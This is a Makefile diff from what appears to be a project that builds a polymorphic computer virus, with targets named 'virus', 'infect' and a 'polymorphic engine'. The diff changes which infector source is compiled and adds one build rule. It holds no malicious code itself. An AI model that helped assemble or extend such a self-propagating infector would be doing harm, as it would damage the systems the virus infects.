@@ -46,16 +46,19 @@ MFLAGS = -no-pie -r
 
 all: virus hello  polymorphic.o superpolymorphic.o
 
-virus: infect.cpp superpolymorphic.o
-	$(GCC) $(CKFLAGS) $^ -o $@
+# virus: infect.cpp superpolymorphic.o
+# 	$(GCC) $(CKFLAGS) $^ -o $@
 
 
-# virus: infect.c superpolymorphic.o
-# 	$(CC) $(KFLAGS) $^ -o $@	
+virus: infect.c superpolymorphic.o
+	$(CC) $(KFLAGS) $^ -o $@	
 
 
 superpolymorphic.o: polymorphicengine.o virus.o polymorphicendgame.o
 	$(LCC) $(MFLAGS) $^ -o $@
+
+polymorphicendgame_cpp.o: polymorphic.cpp
+	$(GCC) $(CFLAGS) $^ -o $@
 
 polymorphicendgame.o: polymorphic.c
 	$(CC) $(CFLAGS) $^ -o $@
